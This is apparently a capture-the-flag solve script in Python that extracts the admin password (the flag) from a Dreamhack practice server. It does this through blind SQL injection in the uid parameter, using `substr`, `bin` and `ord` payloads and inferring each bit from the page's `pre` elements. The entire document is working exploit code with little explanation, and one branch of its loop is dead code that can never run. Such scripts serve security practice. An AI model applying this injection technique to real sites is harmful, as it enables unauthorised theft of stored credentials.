# -*- coding:utf-8 -*-

import requests, sys
from bs4 import BeautifulSoup
import unicodedata

if __name__ == "__main__":
    url = "http://host3.dreamhack.games:19957/?uid="
    ans = "DH{"  # DH{ooooooo!?}

    for i in range(4, 11):  # 형식이 DH{} 임을 이요해서 플래그의 전체 길이 먼저 찾음
        if i < 4 or i > 10:
            ch = 32
            while ch < 127:
                sql = f"admin' and substr(upw, {i} , 1) = char({ch}) -- -"

                res = requests.get(url + sql)
                soup = BeautifulSoup(res.text, "html.parser")
                preList = soup.find_all("pre")
                print(i, ch, len(preList))
                if len(preList) > 1:
                    ans += chr(ch)
                    break
                ch += 1
        # if ch == 127:
        #     ans += "o"  # 아스키코드가 아닌 부분 찾아서 한글인 부분 찾음
        else:
            val = ""
            for idx in range(1, 25):
                sql = (
                    f"admin' and substr(bin(ord(substr(upw, {i} , 1))), {idx}, 1) -- -"
                )

                res = requests.get(url + sql)
                soup = BeautifulSoup(res.text, "html.parser")
                preList = soup.find_all("pre")
                # print(i, idx, len(preList))
                val += "1" if len(preList) > 1 else "0"
            print(val)
            ans += int.to_bytes(int(val, 2), 8, "big").decode("utf-8")

    print(ans)
